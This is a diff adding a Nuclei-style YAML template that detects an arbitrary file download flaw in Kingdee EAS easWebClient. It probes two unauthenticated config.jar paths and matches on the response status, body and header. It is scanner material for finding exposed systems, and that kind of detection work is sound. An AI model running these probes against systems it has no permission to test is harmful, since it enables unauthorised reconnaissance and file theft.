@@ -1,0 +1,29 @@
+id: kingdee-eas-easwebclient-anyfile-download
+info:
+  name: 金蝶 EAS easWebClient 任意文件下载漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  metadata:
+    product: Kingdee EAS
+  description: |
+    This template detects an arbitrary file download vulnerability in Kingdee EAS easWebClient.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/easWebClient/bin/config.jar"
+      - "{{BaseURL}}/easWebClient/bin/lib/config.jar"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "MANIFEST.MF"
+          - "kingdee/eas"
+      - type: word
+        part: header
+        words:
+          - "application/java-archive"
